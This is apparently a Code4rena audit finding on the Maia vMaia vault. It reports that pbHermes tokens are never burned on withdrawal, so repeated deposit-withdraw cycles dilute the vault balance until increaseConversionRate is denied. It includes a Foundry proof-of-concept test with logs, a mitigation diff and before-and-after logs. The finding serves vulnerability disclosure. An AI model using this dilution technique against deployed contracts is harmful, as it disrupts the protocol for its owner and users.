## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-22

# [Maia Governance token balance dilution in `vMaia` vault is breaking the conversion rate mechanism](https://github.com/code-423n4/2023-05-maia-findings/issues/473) 

# Lines of code

https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L235-L246
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L215-L229


# Vulnerability details

## Impact
Once a user deposits `Maia` ERC-20 tokens into the `vMaia` ERC-4626 vault, he is eligible to claim 3 kinds of utility tokens, bHermes Weight & Governance and Maia Governance (pbHermes, partner governance). On each deposit, new Maia Governance tokens (pbHermes) are [minted to the vault in proportion to the deposited amount](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L235-L246), but those tokens are [never burned on withdrawal](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L248-L256). This naturally dilutes the vault's `pbHermes` token balance during the course of users depositing & withdrawing `Maia` tokens. Futhermore, a malicious user can dramatically accelerate this dilution by repeatedly depositing & withdrawing within a single transaction.  
*Note that the vault's bHermes Weight & Governance token balances are not diluted during this process.*  

However, the [ERC4626PartnerManager.increaseConversionRate(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L215-L229) method (`ERC4626PartnerManager` is base of `vMaia` contract) relies on the vault's `pbHermes` token balance and therefore imposes a lower limt on an increased pbHermes<>bHermes coversion rate to avoid underflow, see [L226](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L226): `min. rate = vault balance of pbHermes / Maia tokens in vault`. Meanwhile the upper limit for a new conversion rate is given by [L219](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L219): `max. rate = vault balance of bHermes / Maia tokens in vault`.  

As a consquence, the `vMaia` vault owner's ability to increase the conversion rate is successively constrained by user deposits & withdrawals, until the point where the dilution of `pbHermes` reaches `vault balance of pbHermes > vault balance of bHermes` which leads to complete DoS of the [ERC4626PartnerManager.increaseConversionRate(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L215-L229) method.


## Proof of Concept

The following PoC verifies the above claims about `pbHermes` dilution and `increaseConversionRate(...)` DoS, just apply the *diff* below and run the new in-line documented test case with `forge test -vv --match-test testDepositMaiaDilutionUntilConversionRateFailure`:
```diff
diff --git a/test/maia/vMaiaTest.t.sol b/test/maia/vMaiaTest.t.sol
index 6efabc5..2af982e 100644
--- a/test/maia/vMaiaTest.t.sol
+++ b/test/maia/vMaiaTest.t.sol
@@ -7,6 +7,7 @@ import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

 import {vMaia, PartnerManagerFactory, ERC20} from "@maia/vMaia.sol";
 import {IBaseVault} from "@maia/interfaces/IBaseVault.sol";
+import {IERC4626PartnerManager} from "@maia/interfaces/IERC4626PartnerManager.sol";
 import {MockVault} from "./mock/MockVault.t.sol";

 import {bHermes} from "@hermes/bHermes.sol";
@@ -47,7 +48,7 @@ contract vMaiaTest is DSTestPlus {
             "vMAIA",
             address(bhermes),
             address(vault),
-            address(0)
+            address(this) // set owner to allow call to 'increaseConversionRate'
         );
     }

@@ -86,6 +87,39 @@ contract vMaiaTest is DSTestPlus {
         assertEq(vmaia.balanceOf(address(this)), amount);
     }

+    function testDepositMaiaDilutionUntilConversionRateFailure() public {
+        testDepositMaia();
+        uint256 amount = vmaia.balanceOf(address(this));
+
+        // fast-forward to withdrawal Tuesday
+        hevm.warp(getFirstDayOfNextMonthUnix());
+
+        for(uint256 i = 0; i < 10; i++) {
+            // get & print bHermes & pbHermes vault balances
+            uint256 bHermesBal = bhermes.balanceOf(address(vmaia));
+            uint256 pbHermesBal = vmaia.partnerGovernance().balanceOf(address(vmaia));
+            console2.log("vault balance of bHermes: ", bHermesBal);
+            console2.log("vault balance of pbHermes:", pbHermesBal);
+
+            // dilute pbHermes by withdraw & deposit cycle
+            vmaia.withdraw(amount, address(this), address(this));
+            maia.approve(address(vmaia), amount);
+            vmaia.deposit(amount, address(this));
+
+            // get diluted pbHermes balance and compute min. conversion rate accordingly
+            pbHermesBal = vmaia.partnerGovernance().balanceOf(address(vmaia));
+            uint256 minNewConversionRate = pbHermesBal / vmaia.totalSupply();
+            // check if dilution caused constraints are so bad that we get DoS
+            if (pbHermesBal > bHermesBal)
+            {
+                hevm.expectRevert(IERC4626PartnerManager.InsufficientBacking.selector);
+            }
+            vmaia.increaseConversionRate(minNewConversionRate);
+        }
+
+
+    }
+
     function testDepositMaiaAmountFail() public {
         assertEq(vmaia.bHermesRate(), bHermesRate);

```

We can clearly see the increasing dilution after each withdrawal-deposit cycle and get the expected **revert**, see if-condition, after reaching critical dilution:
```
[PASS] testDepositMaiaDilutionUntilConversionRateFailure() (gas: 1759462)
Logs:
  2023 2
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 200000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 400000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 800000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 1600000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 2400000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 3200000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 4000000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 4800000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 5600000000000000000000
```

## Tools Used
VS Code, Foundry

## Recommended Mitigation Steps

Burn the excess `pbHermes` tokens on withdrawal from `vMaia` vault:
```diff
diff --git a/src/maia/tokens/ERC4626PartnerManager.sol b/src/maia/tokens/ERC4626PartnerManager.sol
index b912bab..31cfef7 100644
--- a/src/maia/tokens/ERC4626PartnerManager.sol
+++ b/src/maia/tokens/ERC4626PartnerManager.sol
@@ -252,6 +252,7 @@ abstract contract ERC4626PartnerManager is PartnerUtilityManager, Ownable, ERC46
      * @param amount amounts of vMaia to burn
      */
     function _burn(address from, uint256 amount) internal virtual override checkTransfer(from, amount) {
+        ERC20MultiVotes(partnerGovernance).burn(address(this), amount * bHermesRate);
         super._burn(from, amount);
     }

```

We can see that this fixes the dilution issue:
```
[PASS] testDepositMaiaDilutionUntilConversionRateFailure() (gas: 2150656)
Logs:
  2023 2
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
  vault balance of bHermes:  1000000000000000000000
  vault balance of pbHermes: 100000000000000000000
```



## Assessed type

ERC20